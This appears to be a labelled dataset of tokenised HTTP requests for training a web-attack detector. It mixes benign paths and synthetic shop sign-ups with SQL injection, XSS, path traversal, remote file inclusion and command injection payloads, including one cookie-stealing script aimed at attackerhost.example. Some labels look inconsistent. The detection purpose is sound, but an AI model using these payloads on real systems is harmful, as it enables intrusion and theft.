request	label
/ yellow_bullet / 	0
/ string / strings / parameters = ;  str =  $  ( echo ysdkbb )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ string / modo = entrar & login = bittman & pwd = camueso & remember = off & b1 = entrar 	0
/ string / strings / parameters = -2798 '  +  ( select  ' emui '  where 9565 = 9565 union all select 9565 , 9565 , 9565 , 9565 -- 	1
/ string / strings / parameters = gwohsing 	0
/ string / strings / parameters = jamaal 	0
/ string / modo = registro & login = evans & password = 8m48a & nombre = liana & apellidos = sastre + molt & email = tefane @ 978 . mp & dni = 97041884p & direccion = calle +  * al + c * anar + 90 ,  +  & ciudad = mosqueruela & cp = 19490 & provincia = zamora & ntc = 7521556295534229 & b1 = registrar 	1
/ string / strings / parameters = pulsar 	0
/ 256788 / 	0
/ 000086427 / 	0
/ att86841 / 	0
/ king stephen / 	0
/ javascript / msadm . jar 	0
/ f2183131 / 	0
"/ string / strings / parameters = ""  /  >  < img / onerror =  \ x60javascript : alert ( 1 )  \ x60src = xxx : x  /  > "	1
/ mobilit \ xc3 \ xa9 / 	0
/ scripts / fileseek . cgi ? foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & head = 	1
/ examples / jsp / checkbox / modules . php ? name = my_egallery 	0
/ javascript / rakefile . exe 	1
/ 126540 / 	0
/ string / strings / parameters = password :  *  /  = 1 -- 	1
/ string / modo = registro & login = kamran & password =  + sacio & nombre = bladimiro & apellidos = barreda + icaza & email = cserhalmi @ ankawaelda . net & dnia = 41585257s & direccion = c /  + rossello + 154 + 13-h & ciudad = atez & cp = 31264 & provincia = cantabria & ntc = 9078165703256769 & b1 = registrar 	1
/ javascript / aspx . fcgi 	0
"/ j4rdyhw8 . cfm ?  < meta http-equiv = set-cookie content =  "" testrluj = 1420 ""  > "	1
/ examples / jsp / colors / core / editor . php ? editor_insert_bottom =  / etc / passwd 	1
"/ fo564rei . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ recordings / add_url . htm ? node =  < script > alert (  ' xss '  )  <  / script > 	1
/ forum1_professionnel . asp ? n = 1771 & amp ; nn =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc . passwd & amp ; page = 1 	1
/ string / strings / parameters = 36563093q 	0
/ 000031690 / 	0
/ string / strings / parameters = avellanosa de mu 	0
/ string / modo = entrar & login = waggoner & pwd = rosquiller3 & remember = on & b1 = entrar 	0
/ string / strings / parameters = oreste 	0
/ admin / file_manager . php ? action = read & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ inc_user . php ? include_path = xxpathxx ? 	1
/ string / modo = registro & login = lilias & password = f36hu1a & nombre = ken & apellidos = tint + monteon & email = salce @ masqueclases . tg & dni = 92246932g & direccion = calle + madian ,  + 130 + 10 ? h & ciudad = argecilla & cp = 09560 & provincia = soria & ntc = 7767845764116700 & b1 = registrar 	0
/ string / strings / parameters = 1 '  where 9241 = 9241 or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' wtdz '  from dual where 1866 = 1866 or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ string / strings / parameters = 1es6si47e7t1 	0
/ 162456 / 	0
/ string / strings / parameters = 46343482t 	0
/ string / modo = registro & login = mwa & password = ja34ico & nombre = paula & apellidos = borque + clua & email = tarasova_dabo @ comerciosdeaspe . ly & dni = 15820845l & direccion = bravo + murillo + 18 +  & ciudad = ponts & cp = 10373 & provincia = toledo & ntc = 0106705329803127 & b1 = registrar 	0
/ string / strings / parameters = ech5d7 	0
"/ string / strings / parameters = ""  |   [  2 -ne  $  ( echo nreisi  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | "	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testcmax = 9270 ""  > "	1
/ string / strings / parameters = -6659 '  )  where 1256 = 1256 union all select 1256 , 1256 -- 	1
/ javascript / closing . trace 	0
/ javascript / mysqld . exe 	1
/ string / strings / parameters = abajo 	0
/ string / strings / parameters = mariana 	0
/ primates / 	0
/ examples / jsp / colors / cal_event . php ? id = 1 '  union select 1 , 2 ,  ' calendarix_id_sql_injection . nasl '  , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 -- 	1
"/ string / strings / parameters = ""  < object type =  ' text / x-html '  data =  ' javascript : prompt (  / xss /  . source )  ; var x  =  prompt ; x ( 0 )  ; x (  / xss /  . source )  ; x '  >  <  / object >  "" "	1
/ string / strings / parameters = | echo $ ifsmcyfyc $  (  ( 94 + 33 )  )  $  ( echo $ ifsmcyfyc ) mcyfyc /  / 	1
/ recordings / main . php ? g2_itemid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / license \ x00 	1
/ javascript / keep . ppt 	0
/ scripts / xtextarea . scr . php ? globals [ pth ]  [ spaw ]  =  @ rfiurl ? globals [ pth ]  [ spaw ]  =  @ rfiurl ? 	1
/ string / strings / parameters = borrachero muros 	0
"/ i2n4v4rl . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ cgi-bin / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331908881 '  ,  ' 5 '  -- 	1
/ string / strings / parameters = 59529079l 	0
/ string / strings / parameters = |   [  5 -ne  $  ( echo gjjxkm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / strings / parameters = 1 '  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ' kdxg '  like  ' kdxg 	1
/ javascript / push . php3 	0
"/ main . php ? stuff =  "" ping \ x0c-w \ x0c9000 \ x0c-n \ x0c1 \ x0c4 . 3 . 2 . 1 | rem \ x0c "	1
"/ zv8tv7h8 . jsp ?  < script > document . cookie =  "" testcqwz = 9752 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  +  ( select  ' diet '  where 7004 = 7004 rlike sleep ( 5 )  )  +  ' 	1
"/ string / strings / parameters = < iframe srcdoc =  ""  & lt ; iframe & sol ; srcdoc =  & amp ; lt ; img & sol ; src =  & amp ; apos ;  & amp ; apos ; onerror = javascript : alert ( 1 )  & amp ; gt ;  >  ""  > "	1
/ 42514550437759425456696b6e673d3d / 	0
/ string / strings / parameters = -5830 '  )  as fivy where 2173 = 2173 or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  -- 	1
/  .  /  .  /  .  /  .  /  .  /  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ en-us / 9kr0ih0v . do ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
"/ gy23xnjq . cgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ wayne_kramer / 	0
/ javascript / components . lib 	0
/ string / strings / parameters = 5076820691273276 	0
/ memoryflash / 	0
/ javascript / vendors . htm 	0
"/ string / strings / parameters = ""  echo dxyhwc $  (  ( 70 + 59 )  )  $  ( echo dxyhwc ) dxyhwc \  \ "	1
/ help . php ? q =  '  | sleep 8  # 	1
/ string / strings / parameters = paseo francisco mir berlanga 141 ,  12-e 	0
/ bn857frh . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 162777 / 	0
/ 6d8678ec80aa64e1ace0d30a727cbd94 / 	0
/ 8b91d6dcf2140100418fe9568b603bd9 / 	0
"/ string / strings / parameters = < a href =  "" data : text / html ; base64 , phnjcmlwdd5hbgvydcgwktwvc2nyaxb0pg =  =  ""  > ugh <  / a > "	1
/ string / strings / parameters = 7 	0
/ string / strings / parameters = offers 	0
/ cgi-local / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = |   [  8 -ne  $  ( echo mumuqi  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ string / strings / parameters = grevelin 	0
"/ fa8p8lr8 . fts ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = bailn 	0
/ string / strings / parameters = 1 '  +  ( select  ' ezpy '  where 5282 = 5282 order by 1 # 	1
"/ string / strings / parameters = -1475 ""  ""  )  union all select 8611 , 8611 , 8611 # "	1
/ string / strings / parameters = escat monistca 	0
/ opensiteadmin / scripts / classes / filters / singlefilter . php ? path = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  \ x00 	1
/ string / strings / parameters = 1 %  '  )  )  )  ; select sleep ( 5 )  # 	1
/ javascript / statistic . fcgi 	0
/ string / strings / parameters = 1 %  '  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  '  %  '  =  ' 	1
/ javascript / modify . err 	0
/ men &  # 39 ; s-issues / 	1
/ string / strings / parameters = ;  str =  $  ( echo etahjn )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ msg675695 / 	0
"/ string / strings / parameters = -1072 %  ""  ""  )  )  or 3090 = 3539 "	1
/ string / strings / parameters = 1 )  )  as fynx where 9636 = 9636 union all select null , null , null , null , null -- 	1
/ string / strings / parameters = '  & echo gpemqs $  (  ( 51 + 70 )  )  $  ( echo gpemqs ) gpemqs \ 	1
"/ main . php ? stuff =  ""  \ x0adel q55324883  # "	1
/ doug sahm / 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo ivnsbh )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ cgi-home / pfdispaly . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  ' 	1
/ string / strings / parameters = 1737 	0
/ javascript / sink . o 	0
/ 112872222499420794 / 	0
/ common . inc . php ? cfg [ libdir ]  = xxpathxx 	1
/ q29585118 	0
/ string / strings / parameters = kit 	0
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo jeorxy  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ membership-levels / 	0
/ bittorrent_536349 / 	0
/ string / strings / parameters = 1 '  or 4240 =  ( select 4240 from pg_sleep ( 5 )  )  -- 	1
/ b000btdmdc / 	0
/ javascript / abcd . exe 	1
/ examples / jsp / sessions / view_user . php ? list = 1 & letter =  & sort_by =  ' select 	1
"/ eg2u8pbv . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = 1 ""  ""  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  -- "	1
/ aboutus_movie / 	0
/ string / strings / parameters = 6204145249044457 	0
/ string / strings / parameters = 80u90i9 	0
/ string / strings / parameters = ; echo ekhlzg $  (  ( 64 + 29 )  )  $  ( echo ekhlzg ) ekhlzg \ 	1
/ string / strings / parameters = 1 '  in boolean mode )  and 5725 = 5552 # 	1
/ nsn /  .  .  \ web / env . bas 	1
/ string / modo = registro & login = stefanac & password = autointoxicacin & nombre = eudoro & apellidos = valderrbano & email = marleau @ rosaserigrafia . nz & dni = 08475533x & direcciona = pl .  + elio + antonio + de + nebrija ,  + 34 +  & ciudad = santa + mara + del + cubillo & cp = 43740 & provincia = guadalajara & ntc = 3535089372971785 & b1 = registrar 	1
/ phpmyadmin / store . php ? crn = 42 '  & action = show & show_products_mode = cat_click 	1
"/ en-us / esmozg5d . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = sarri orbe 	0
/ 173148 / 	0
/ string / strings / parameters = 1 )  )  )  union all select null , null , null , null , null # 	1
/ javascript / faq . exe 	1
/ tabs_onfaithpostg2 / 	0
/ string / strings / parameters = lengua barrios 	0
/ javascript / signed . err 	0
/ feature_alerts / 	0
/ string / strings / parameters = ; echo hgvpjy $  (  ( 28 + 49 )  )  $  ( echo hgvpjy ) hgvpjy & 	1
/ sftu057_1 / 	0
"/  < meta http-equiv = set-cookie content =  "" testviqu = 1270 ""  > "	1
/ string / modo = entrar '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & login = jeanes & pwd = d712 & remember = on & b1 = entrar 	1
/ 184530 / 	0
/ whatisthedifferencebetweenpostsandstories / 	0
/ javascript / component . nsf 	0
/ string / strings / parameters = calle virgen de la estrella ,  196 	0
/ cgi-bin / phptonuke . php ? filnavn =  / etc / passwd 	1
/ 0x2e0x2e \  { file } 	1
/ javascript / is . tpl 	0
/ string / modo = registro & login = seagrove & password = pataleo & nombre = grey & apellidos = bollit + ingls & email = weigel @ lamasguapa . cc & dni = 15744863y & direcciona = avda .  + el + vado ,  + 72 +  & ciudad = torno ,  + el & cp = 18129 & provincia = cceres & ntc = 2139911097438297 & b1 = registrar 	1
"/ jackrabbit / search . jsp ? q =  %  ""  < script > alert ( 1331922005 )  <  / script > "	1
"/ lsoix5h3 . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = ; echo ukkxoy $  (  ( 15 + 70 )  )  $  ( echo ukkxoy ) ukkxoy 	1
"/ t7tm4m0b . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / zips . gif 	0
/ webprogramming / 	0
/ string / strings / parameters = 1 )  and 2457 = 8146 	1
/ financial_servi / 	0
"/ string / modo = insertar & precio = 588 & b1 = pasar + por + cajaparos ""  + style =  "" background : url ( javascript : alert (  ' paros '  )  )  & id = 2 "	1
/ string / strings / parameters = < body onscroll = alert ( 1 )  >  < br >  < br >  < br >  < br > 	1
/ string / modo = registro & login = angeline0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & password = tasajo & nombre = anataln & apellidos = gironell + nurnberg & email = alari-clayton @ blueeyes . mm & dni = 02864580e & direccion = c /  + pescadores + de + terranova ,  + 108 ,  + 9-e & ciudad = gironella & cp = 34309 & provincia = lleida & ntc = 1940469779787284 & b1 = registrar 	1
/ d5eea662d8427a0e833ddd285b296f721b992b74 / 	0
/ string / str =  $  ( echo fnslec )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
"/ string / strings / parameters = ""  & echo ibiyqc $  (  ( 4 + 38 )  )  $  ( echo ibiyqc ) ibiyqc "	1
/ annex_a / 	0
/ 205_goearly / 	0
"/ a0imiuf1 . html ?  < script > document . cookie =  "" testxqrn = 4654 ;  ""  <  / script > "	1
/ scripts / index . php ? option = frontpage & itemid = 2 | system ( id )  | 1331919202 	1
/ 066893 / 	0
/ language / lang_german / lang_main_album . php ? phpbb_root_path = xxpathxx ? a = 	1
/ string / modo = insertar & precio = 9594 & b1 = pasar + por + caja / 	1
"/ zuihld5m . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / buttons . phtml 	0
"/ string / strings / parameters = 1 ""  ""  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 and  ""  "" rukx ""  ""  like  ""  "" rukx "	1
/ examples / jsp / jsp2 / jspx / admin / components / com_fm / fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = limbo_com_fm_php_shell . nasl-1331904435 	1
/ 580153 / 	0
/ 110584 / 	0
/ javascript / wsdl . stackdump 	0
/ string / strings / parameters = '   str =  $  ( echo fyhgfl )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ holiday_villas / 	0
/ s_soft / 	0
/ ns2513370880 / 	0
/ javascript / hardcore . htm 	0
"/ phpmyadmin / review . php ? id = 1 & cat =  & subcat =  ""  >  < script > alert (  ' phpmydirectory_multiple_xss . nasl '  )  ;  <  / script > "	1
/ javascript / accessibility . pfx 	0
/ en-us / account / shopper . cgi ? newpage =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / modo = insertar & precio = 3749 & b1 = pasar + por + caja 	0
/ string / str =  $  ( echo qofxcy )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ planet-6 / 	0
/ postal_information / 	0
/ string / strings / parameters = echo $ ifshivknh $  (  ( 59 + 63 )  )  $  ( echo $ ifshivknh ) hivknh 	1
/ 20040920-4207 / 	0
"/ string / id = 2 & nombre = jamn + ibricoparos ""  + style =  "" background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & precio = 100 & cantidad = 6 & b1 = aadir + al + carrito "	1
/ hard59 / 	0
/ string / strings / parameters = terri 	0
"/ string / strings / parameters = < input type =  ""  "" image ""  ""  src =  ""  "" javascript : document . cookie = true ;  ""  ""  > "	1
/ 851596 / 	0
/ string / strings / parameters = |   [  8 -ne  $  ( echo cxwpxj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ aro_333399 / 	0
"/ login . php ? course =  ""  >  < script > alert ( atutor_xss . nasl )  <  / script > "	1
/ examples / jsp / sessions / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login 	1
/ string / str =  $  ( echo gqpjfy )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
"/ nuh3zirz . x ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = "" echo wxrsmm $  (  ( 62 + 81 )  )  $  ( echo wxrsmm ) wxrsmm & "	1
/ 125006 / 	0
/ polk-county / 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' lkmh '  where 7659 = 7659 ; select pg_sleep ( 5 )  )  |  |  ' 	1
/ phpmyadminmultihtml . pl ? multi =  / etc / passwd \ x00html 	1
/ u6560738 / 	0
/ 646384835 / 	0
/ javascript / intl . asp 	0
/ string / strings / parameters = vilamasa pacheca 	0
/ help . php ? q =  ; del \ x09q36511176 \ x09 # 	1
/ 2159606 / 	0
/ string / strings / parameters = murphy-ekstroem @ altoguadiana . ao 	0
/ string / id = 1 & nombre = queso + manchego & precio = 39 & cantidad = 23 & b1 = aadir + al + carrito 	0
"/ string / strings / parameters = < a href =  ""  \ xe2 \ x80 \ x81javascript : javascript : alert ( 1 )  ""  id =  "" fuzzelement1 ""  > test <  / a > "	1
"/ string / strings / parameters = <  !  [  >  < img src =  ""  ]  >  < img src = x onerror = alert ( 39 )  /  /  ""  > "	1
"/ vhzmaia2 . aspx ?  < meta http-equiv = set-cookie content =  "" testkogj = 3979 ""  > "	1
"/ 9ko6m4c8 . kspx ?  < script > document . cookie =  "" testylik = 3403 ;  ""  <  / script > "	1
/ string / modo = entrar & login = walliw & pwd = r3ic5 & remember = on & b1 = entrar 	0
/ title_quotes / 	0
/ string / strings / parameters = darbie 	0
/ string / strings / parameters = &  # x003e 	1
/ 000097844 / 	0
/ javascript / lang . rb 	0
/ string / strings / parameters = < svg >  < x >  < script > alert ( 1 )  <  / x > 	1
/ string / strings / parameters = 78128253j 	0
/ security_advisories / 	0
/ hyundai-arnejs_3 / 	0
/ javascript / java . exe 	1
/ string / strings / parameters = 1 '  )  where 3767 = 3767 and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  -- 	1
/ javascript / statement . msg 	0
/ 0706062rush1 / 	0
/ string / strings / parameters = 74779691k 	0
/ 184869_1 / 	0
/ for_pd / 	0
/ amazon / index . php ? lang = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ? 	0
/ string / strings / parameters = muoz capato 	0
/ string / strings / parameters = guerette 	0
/ 110365 / 	0
/ string / strings / parameters = 1 )  )  )  or 6979 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ texis . exe /  ? -dump 	1
/ zipped / 	0
/ javascript / usr . exe 	1
"/ j4rdyhw8 . asp ?  < script > document . cookie =  "" testrluj = 1420 ;  ""  <  / script > "	1
/ rsindex / 	0
/ string / strings / parameters = 9755 	0
/ winnersawards / 	0
/ new_legends / 	0
/ eclipseplugin-cbg / 	0
/ javascript / head . rb 	0
/ ipih_eradication / 	0
/ string / strings / parameters = 3596 	0
/ string / strings / parameters = '  ) print (  ` echo satcyu `  .  ` echo  $  (  ( 51 + 26 )  )  `  .  ` echo satcyu `  .  ` echo satcyu `  )  ;  \  \ satcyu 	1
/ help . php ? q =  ' rm \ x09q87915929 \ x09 # 	1
/ string / strings / parameters = 1 %  '  )  )  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  '  %  '  =  ' 	1
/ 223_airjack26-0 / 	0
/ tun_gifts / 	0
/ activities_01 / 	0
/ cgi-home / texis . exe / junk 	1
"/ string / strings / parameters = < script > x =  ""  ""  * prompt ( 9 )  *  ""  ""  ; y = 42 ;  <  / script > "	1
/ solution_menus / 	0
/ a +  screensaver creator 3 / 	0
/ string / modo = registro & login = linnell & password = 9oautora & nombre = orieta & apellidos = coch + soto & email = zilzer @ foreignoffice . fo & dni = 75022145d & direccion = c /  + gomera + 148 + 3 ? e & ciudad = cabolafuente & cp = 45280 & provincia = tarragona & ntc = 3549373062406547 & b1 = registrar 	0
"/ string / str =  $  ( echo jmudmj )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ string / strings / parameters = 850il1ta045n 	0
/ string / strings / parameters = 1 )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  ( 6824 = 6824 	1
/ string / strings / parameters = asensio kuschel 	0
/ commitee / 	0
/ phpmyadmin / index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1331904418 '  , null , null , null , null  -- 	1
/ string / strings / parameters = 4909 	0
/ leostream_expan / 	0
/ string / strings / parameters = |  | echo ktazqg $  (  ( 85 + 41 )  )  $  ( echo ktazqg ) ktazqg | 	1
/ javascript / b . php3 	0
/ 327194 / 	0
/ legislatie / 	0
/ examples / servlets / servlet / includes / db_adodb . php ? basedir =  / etc / passwd \ x00 	1
/ web-editions / 	0
/ string / strings / parameters = 1 )  where 1100 = 1100 and sleep ( 5 )  -- 	1
/ javascript / track . tar 	0
/ adobe photoshop elements 2 / 	0
/ string / id = 1 & nombre = vino + riojasessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / attackerhost . example / cgi-bin / cookiesteal . cgi ?  '  + document . cookie <  / s + cript >  ?  & precio = 85 & cantidad = 21 & b1 = aadir + al + carrito 	1
/ javascript / xxx . bat 	0
/ string / strings / parameters = and  ( select substring (  @  @ version , 1 , 1 )  )  =  ' x ' 	1
/ javascript / array 	0
/ ddapublications / 	0
/ x ' squeezeme ! _v3 / 	1
/ string / strings / parameters = v9lenc8an3sm9 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  -- "	1
/ string / strings / parameters = 7263031959103699 	0
/ string / strings / parameters = melanson 	0
/ exotics / 	0
/ files / amazon-bestsellers . php ? carppath = xxpathxx 	1
/ examples / jsp / jsp2 / el / gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ help . php ? q =  ""  | ping , -w , 11000 , -n , 1 , 1 . 2 . 3 . 4 | rem , "	1
/ volpano / 	0
/ jun2006_eng / 	0
/ represent_sl / 	0
/ string / strings / parameters = 05141 	0
/ string / strings / parameters = 60613075w 	0
"/ string / strings / parameters = 1 ""  ""  )  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  and  (  ""  "" rphs ""  ""  =  ""  "" rphs "	1
/ string / strings / parameters = chiarell1 	0
/ string / strings / parameters = '  &  & echo nlwqzv $  (  ( 48 + 73 )  )  $  ( echo nlwqzv ) nlwqzv /  / 	1
/ string / strings / parameters = |  |  / usr / bin / id | 	1
/ sm-serversback / 	0
/ classes / board_o . php ? absolutepath = xxpathxx 	1
/ string / modo = insertar & precio = 9637 & b1 = pasar + por + caja 	0
/ b0006n2ehi / 	0
/ javascript / bfc . conf 	0
/ string / strings / parameters = 1 )  as tkkn where 7832 = 7832  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  -- 	1
/ javascript / restore . png 	0
/ javascript / wwwstats . msg 	0
/ string / strings / parameters = -2303 '  )  )  as exyt where 2528 = 2528 or 8571 = 8571 -- 	1
/ string / strings / parameters = '   str =  $  ( echo giprgx )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ 8273165 / 	0
/ string / strings / parameters = hadrian 	0
/ main . php ? logout =  '  ; del \ x09q79392194 \ x09 # 	1
"/ mv8wxfy9 . cfc ?  < script > document . cookie =  "" testrhbc = 8184 ;  ""  <  / script > "	1
/ javascript / tracking . lst 	0
/ ldap / authldap . php ? includepath = xxpathxx 	1
/ javascript / ico . tgz 	0
/ heroes s01e10 hdtv xvid / 	0
/ string / strings / parameters = < script src =  %  ( jscript ) s >  <  / script > 	1
/ ezinequeen / 	0
/ examples / jsp / jsp2 / el / blog . cgi ? submit = viewfile & month = 01 & year = 2004 & file =  | cat  / etc / passwd | 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as aamh where 7432 = 7432  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  -- "	1
/ 1222324652 / 	0
/ cgi-win / fileseek2 . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd 	1
"/ string / strings / parameters = 1 ""  ""  )  )  and exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8190 = 8190 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  (  ""  "" rvuz ""  ""  like  ""  "" rvuz "	1
